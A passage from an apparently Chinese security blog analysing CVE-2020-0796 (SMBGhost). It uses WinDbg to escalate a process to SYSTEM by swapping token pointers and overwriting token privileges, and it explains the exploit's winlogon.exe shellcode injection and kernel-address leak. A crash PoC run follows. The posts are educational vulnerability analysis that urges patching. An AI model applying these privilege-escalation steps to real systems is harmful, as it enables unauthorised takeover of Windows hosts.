SeAssignPrimaryTokenPrivilege   Attributes - </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege       Attributes - Enabled Default </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege     Attributes - </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege          Attributes - Enabled Default </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege        Attributes - </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege     Attributes - </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege       Attributes - </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege     Attributes - Enabled Default </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege       Attributes - </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege  Attributes - Enabled Default </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege  Attributes - Enabled Default </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege     Attributes - Enabled Default </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege    Attributes - Enabled Default </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege         Attributes - </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege        Attributes - </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege        Attributes - </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege         Attributes - Enabled Default </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege         Attributes - Enabled Default </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege   Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege      Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege         Attributes - </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege      Attributes - </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege      Attributes - Enabled Default </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege      Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege  Attributes - </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege        Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege   Attributes - Enabled Default </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege        Attributes - Enabled Default </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege   Attributes - Enabled Default </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege Attributes - Enabled Default </span><br><span class="line"></span><br><span class="line">Authentication ID:     (0,3e7)</span><br><span class="line">Impersonation Level:    Anonymous</span><br><span class="line">TokenType:         Primary</span><br><span class="line">Source: *SYSTEM*      TokenFlags: 0x2000 ( Token in use )</span><br><span class="line">Token ID: 3eb       ParentToken ID: 0</span><br><span class="line">Modified ID:        (0, 3ec)</span><br><span class="line">RestrictedSidCount: 0   RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 0</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0   Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line">Process Token TrustLevelSid: S-1-19-1024-8192</span><br></pre></td></tr></table></figure>

<p>也可使用dt _TOKEN查看字段定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">  +0x000 TokenSource   : _TOKEN_SOURCE</span><br><span class="line">  +0x010 TokenId     : _LUID</span><br><span class="line">  +0x018 AuthenticationId : _LUID</span><br><span class="line">  +0x020 ParentTokenId  : _LUID</span><br><span class="line">  +0x028 ExpirationTime  : _LARGE_INTEGER</span><br><span class="line">  +0x030 TokenLock    : Ptr64 _ERESOURCE</span><br><span class="line">  +0x038 ModifiedId    : _LUID</span><br><span class="line">  +0x040 Privileges    : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x058 AuditPolicy   : _SEP_AUDIT_POLICY</span><br><span class="line">  ..</span><br></pre></td></tr></table></figure>

<p>在尝试把替换cmd.exe进程的TOKEN指针之前，我们先执行一下whoami看看。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.jpg" alt="img"></p>
<center>图4</center>

<p>如图4中，whoami显示，当前账户是admin。</p>
<p>手动查看cmd.exe进程的TOKEN指针和前文所述基本一致，不再赘述。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff980ddcba8080</span><br><span class="line">  SessionId: 1 Cid: 0ae8  Peb: 1265dcd000 ParentCid: 0d38</span><br><span class="line">  DirBase: 530d6002 ObjectTable: ffffd58733943400 HandleCount: 75.</span><br><span class="line">  Image: cmd.exe</span><br></pre></td></tr></table></figure>

<p>然后把cmd.exe进程的TOKEN指针替换为system的TOKEN指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; eq ffff980ddcba8080+0x360 ffffd587&#96;2c606040</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.jpg" alt="img"></p>
<center>图5</center>

<p>如图5中，再执行一下whoami显示，当前账户已经由admin变化为nt authority\system。</p>
<h2 id="6-TOKEN-0x40偏移"><a href="#6-TOKEN-0x40偏移" class="headerlink" title="6 TOKEN+0x40偏移"></a>6 TOKEN+0x40偏移</h2><p>我们现在来看看memmove()函数的目的地址是否就是cve-2020-0796-local.exe进程的TOKEN指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffff8205e4678590, Dst&#x3D;0xffff998e13d780a0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffff8205e4678290 rbx&#x3D;ffff8205e9ad4150 rcx&#x3D;ffff998e13d780a0</span><br><span class="line">rdx&#x3D;ffff8205e4678590 rsi&#x3D;0000000000000010 rdi&#x3D;ffff8205e4678010</span><br><span class="line">rip&#x3D;fffff80218327f68 rsp&#x3D;ffffe8861b123e70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;0000000000000000 r10&#x3D;ffff8205df002290</span><br><span class="line">r11&#x3D;ffffe8861b123e50 r12&#x3D;0000000000000000 r13&#x3D;ffff8205e8434680</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na po nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000286</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; db rdx L0n16</span><br><span class="line">ffff8205&#96;e4678590 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br><span class="line"></span><br><span class="line">kd&gt; db rcx L0n16</span><br><span class="line">ffff998e&#96;13d780a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br><span class="line"></span><br><span class="line">kd&gt; !process 0 0 cve-2020-0796-local.exe</span><br><span class="line">PROCESS ffff8205e9ad5080</span><br><span class="line">  SessionId: 1 Cid: 16e0  Peb: 44e943b000 ParentCid: 024c</span><br><span class="line">  DirBase: 1abc2002 ObjectTable: ffff998e13777580 HandleCount: 58.</span><br><span class="line">  Image: cve-2020-0796-local.exe</span><br><span class="line"></span><br><span class="line">kd&gt; dq ffff8205e9ad5080+0x360 L1</span><br><span class="line">ffff8205&#96;e9ad53e0 ffff998e&#96;13d7806e</span><br></pre></td></tr></table></figure>

<p>我们发现memmove()函数的目的地0xffff998e<code>13d780a0和cve-2020-0796-local.exe进程的TOKEN指针存放地址ffff8205</code>e9ad53e0相去甚远。但却指向ffff998e`13d78060+0x40处。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">  +0x000 TokenSource   : _TOKEN_SOURCE</span><br><span class="line">  +0x010 TokenId     : _LUID</span><br><span class="line">  +0x018 AuthenticationId : _LUID</span><br><span class="line">  +0x020 ParentTokenId  : _LUID</span><br><span class="line">  +0x028 ExpirationTime  : _LARGE_INTEGER</span><br><span class="line">  +0x030 TokenLock    : Ptr64 _ERESOURCE</span><br><span class="line">  +0x038 ModifiedId    : _LUID</span><br><span class="line">  +0x040 Privileges    : _SEP_TOKEN_PRIVILEGES</span><br></pre></td></tr></table></figure>

<p>从_TOKEN结构体的定义中，我们了解在0x40偏移处是一个_SEP_TOKEN_PRIVILEGES的结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db ffff998e&#96;13d78060+0x40 L0x16</span><br><span class="line">ffff998e&#96;13d780a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br><span class="line">ffff998e&#96;13d780b0 00 00 80 40 00 00                 ...@..</span><br><span class="line"></span><br><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff998e&#96;13d78060+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x000 Present     : 0x00000006&#96;02880000</span><br><span class="line">  +0x008 Enabled     : 0x800000</span><br><span class="line">  +0x010 EnabledByDefault : 0x40800000</span><br><span class="line"></span><br><span class="line">kd&gt; p</span><br><span class="line">srv2!Srv2DecompressData+0x10d:</span><br><span class="line">fffff802&#96;18327f6d 8b442460    mov   eax,dword ptr [rsp+60h]</span><br></pre></td></tr></table></figure>

<p>单步步过之后，再查看一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db ffff998e&#96;13d78060+0x40 L0x16</span><br><span class="line">ffff998e&#96;13d780a0 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br><span class="line">ffff998e&#96;13d780b0 00 00 80 40 00 00                ...@..</span><br><span class="line"></span><br><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff998e&#96;13d78060+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x000 Present     : 0x0000001f&#96;f2ffffbc</span><br><span class="line">  +0x008 Enabled     : 0x0000001f&#96;f2ffffbc</span><br><span class="line">  +0x010 EnabledByDefault : 0x40800000</span><br></pre></td></tr></table></figure>

<p>我们观察到cve-2020-0796-local.exe进程的TOKEN中的Privileges 确实被修改过了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff8d8de&#96;1206040+0x40</span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">  [+0x000] Present     : 0x1ff2ffffbc [Type: unsigned __int64]</span><br><span class="line">  [+0x008] Enabled     : 0x1e60b1e890 [Type: unsigned __int64]</span><br><span class="line">  [+0x010] EnabledByDefault : 0x1e60b1e890 [Type: unsigned __int64]</span><br></pre></td></tr></table></figure>

<p>这神奇的16字节数据正是之前我们曾观察到的System进程的TOKEN中的Privileges的Present值。Present字段表示启用的特权，Enabled字段表示拥有的特权。这神奇的16字节数据覆盖写进程的Privileges结构之后，系统即拥有并启用了的system进程所有的特权。</p>
<p>我们了解到_SEP_TOKEN_PRIVILEGES是由3个bitmap构成的结构体，通过每bit是否为1来判断进程特权的。看上去应该不会超过64种特权。</p>
<h2 id="7-“有种贪心叫我全要”"><a href="#7-“有种贪心叫我全要”" class="headerlink" title="7 “有种贪心叫我全要”"></a>7 “有种贪心叫我全要”</h2><p>如果我们把这16字节全部用0xFF填充呢？</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.jpg" alt="img"></p>
<center>图6</center>

<p>我们使用前文所述的WinDBG手动设置了一下，如图6所示，使用whoami /PRIV命令时会提示“错误： 指定的特权不存在”。我们在微软文档中也仅发现了44中特权。</p>
<p>我们修改了Exploit的源码，编译后执行验证，并在之前的断点停下来确认符合预期。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffff8205e32a2590, Dst&#x3D;0xffff998e11a4c6b0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffff8205e32a2290 rbx&#x3D;ffff8205e5679150 rcx&#x3D;ffff998e11a4c6b0</span><br><span class="line">rdx&#x3D;ffff8205e32a2590 rsi&#x3D;0000000000000010 rdi&#x3D;ffff8205e32a2010</span><br><span class="line">rip&#x3D;fffff80218327f68 rsp&#x3D;ffffe8861a6f9e70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;ffff8205e4e008e0 r10&#x3D;ffff8205df002160</span><br><span class="line">r11&#x3D;ffffe8861a6f9e50 r12&#x3D;0000000000000000 r13&#x3D;ffff8205e8434680</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na po nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000286</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; db rdx L0n16</span><br><span class="line">ffff8205&#96;e32a2590 ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff ................</span><br><span class="line"></span><br><span class="line">kd&gt; db rcx L0n16</span><br><span class="line">ffff998e&#96;11a4c6b0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.jpg" alt="img"></p>
<center>图7</center>

<p>在图7中，结果显示这并不影响Exploit的效果，</p>
<h2 id="8-特权影响名字？"><a href="#8-特权影响名字？" class="headerlink" title="8 特权影响名字？"></a>8 特权影响名字？</h2><p>替换TOKEN不仅可以获取特权，也直接变更了账户。这个可以理解。那么问题来了，虽然修改Privileges结构，可以获得特权，但又是如何影响账户名的呢？</p>
<p>现在我们需要来看看exploit的源码。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.jpg" alt="img"></p>
<center>图8</center>

<p>如图8中源码显示，在修改本进程的_SEP_TOKEN_PRIVILEGES结构之后，就已经获得system进程的特权，后续调用了inject()函数。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.jpg" alt="img"></p>
<center>图9</center>

<p>在图9中，inject()函数中通过CreateToolhelp32Snapshot()创建进程快照，使用比较进程名的方法找到”winlogon.exe”进程。然后使用VirtualAllocEx申请了一块带有可执行属性的内存（PAGE_EXECUTE_READWRITE），WriteProcessMemory把shellcode写入目标进程，CreateRemoteThread()最终完成任务。这是一个经典的远程线程注入。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.jpg" alt="img"></p>
<center>图10</center>

<p>图10中shellcode应该开启cmd的功能。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.jpg" alt="img"></p>
<center>图11</center>

<p>如图11所示，从进程树上我们能清楚的看出cmd.exe是winlogon.exe的子进程，和powershell.exe并未任何关系。</p>
<p>winlogon.exe是以nt authority\system用户的名义启动的，而子进程继承了父进程winlogon.exe的TOKEN，也就获得了system的特权，在使用whoami命令时显示用户也就是nt authority\system。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.jpg" alt="img"></p>
<center>图12</center>

<p>如图12所示，选取winlogon.exe作为注入进程只是一个特例，任何以NT AUTHORITY\SYSTEM或者其他特权账户名义启动的进程都有相同的效果。</p>
<h2 id="9-应用层获取TOKEN的地址编程技巧"><a href="#9-应用层获取TOKEN的地址编程技巧" class="headerlink" title="9 应用层获取TOKEN的地址编程技巧"></a>9 应用层获取TOKEN的地址编程技巧</h2><p>前文我们介绍了如何借助WinDBG手动修改位于内核态内存的进程的访问令牌，现在我们需要了解一下exploit如何使用编程技巧从应用层获取了TOKEN的地址的。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.jpg" alt="img"></p>
<p>从源码上来看，其使用get_process_token()获取到了token在内核中的地址，然后利用CVE-2020-0796漏洞向ktoken+0x40处，即访问令牌中的_SEP_TOKEN_PRIVILEGES字段，写入了数据。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.jpg" alt="img"></p>
<center>图 14</center>

<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.jpg" alt="img"></p>
<center>图 15</center>

<p>在Windows上有一些众所周知的信息泄漏技巧，如本例中使用的NtQuerySystemInformation函数。这个函数有一些神奇的功能，它会返回许多内核地址。我们主要感兴趣的是此函数能够提供目前分配的每个对象的列表，使用SystemExtendedHandleInformation参数调用NtQuerySystemInformation，我们可以得到SYSTEM_HANDLE_INFORMATION_EX结构。借助此列表，我们可以使用PID和句柄获取所需对象的内核地址。</p>
<p>至此漏洞利用视角下的工作基本完成。</p>
<h2 id="10-综述"><a href="#10-综述" class="headerlink" title="10 综述"></a>10 综述</h2><p>本文介绍了2种通过手动修改进程访问令牌或特权结构提升进程权限的技巧，分析了本地权限提升exploit中使用的获取内核地址信息的技巧。带领大家近距离体会了本地权限提升利用过程。后续有机会我们再谈谈关于此漏洞的检测防护。再次提醒请尽快安装官方补丁。</p>
<h2 id="11-参考和引用"><a href="#11-参考和引用" class="headerlink" title="11 参考和引用"></a>11 参考和引用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;danigargu&#x2F;CVE-2020-0796</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;secauthz&#x2F;access-tokens</span><br><span class="line">https:&#x2F;&#x2F;attack.mitre.org&#x2F;techniques&#x2F;T1134&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;secauthz&#x2F;how-dacls-control-access-to-an-object</span><br><span class="line">https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-224058-1.htm</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;86188</span><br></pre></td></tr></table></figure>
<h2 id="12-思考和讨论"><a href="#12-思考和讨论" class="headerlink" title="12 思考和讨论"></a>12 思考和讨论</h2><p>我们思考讨论以下3个问题有没有较好的解决办法？</p>
<ol>
<li>微软为何提供NtQuerySystemInformation函数查看SystemExtendedHandleInformation？</li>
<li>对于简单bitmap结构的_SEP_TOKEN_PRIVILEGES，能不能参考栈cookie那样的形式进行设计？</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="stxletto">
      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="深澜深蓝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞分析视角下的CVE-2020-0796漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-27 22:09:23" itemprop="dateCreated datePublished" datetime="2020-04-27T22:09:23+08:00">2020-04-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-04-28 23:18:08" itemprop="dateModified" datetime="2020-04-28T23:18:08+08:00">2020-04-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="漏洞分析视角下的CVE-2020-0796漏洞"><a href="#漏洞分析视角下的CVE-2020-0796漏洞" class="headerlink" title="漏洞分析视角下的CVE-2020-0796漏洞"></a>漏洞分析视角下的CVE-2020-0796漏洞</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><ul>
<li><p>2020年3月10日是微软补丁日，安全社区注意到Microsoft发布并立即删除了有关CVE-2020-0796的信息；</p>
</li>
<li><p>2020年3月11日早上，Microsoft发布了可纠正SMBv3协议如何处理特制请求的修补程序； </p>
</li>
<li><p>2020年03月12日微软发布安全公告声称Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在远程执行代码漏洞。成功利用此漏洞的攻击者可以获取在目标服务器或客户端上执行代码的能力。要利用针对服务器的漏洞，未经身份验证的攻击者可以将特制数据包发送到目标 SMBv3 服务器。要利用针对客户端的漏洞，未经身份验证的攻击者将需要配置恶意的 SMBv3 服务器，并说服用户连接到该服务器。此安全更新通过更正 SMBv3 协议处理这些特制请求的方式来修复此漏洞。</p>
</li>
<li><p>此缺陷可影响SMB协商中的客户端和服务端。服务端漏洞位于srv2.sys中，客户端漏洞位于mrxsmb.sys中，这两个漏洞最终都在SmbCompressDecompress中调用了相同的代码。</p>
</li>
</ul>
<p>本文试以CVE-2020-0796为例，为读者呈现漏洞分析工作视角。</p>
<h2 id="2-受影响的系统"><a href="#2-受影响的系统" class="headerlink" title="2. 受影响的系统"></a>2. 受影响的系统</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br></pre></td></tr></table></figure>

<h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><p>首先我们来执行CVE-2020-0796的PoC</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin\CVE<span class="literal">-2020</span><span class="literal">-0796</span>\&gt; python .\poc.py <span class="number">192.168</span>.<span class="number">0.10</span></span><br><span class="line">ConnectedSent negotiate packet <span class="number">1</span></span><br><span class="line">Target responded with <span class="number">452</span> bytes</span><br><span class="line">Sent negotiate packet <span class="number">2</span></span><br><span class="line">Target responded with <span class="number">534</span> bytes</span><br><span class="line">Crash bytes sent</span><br><span class="line">winexcept timed out</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.png" alt="img"></p>
<center>图 1</center>

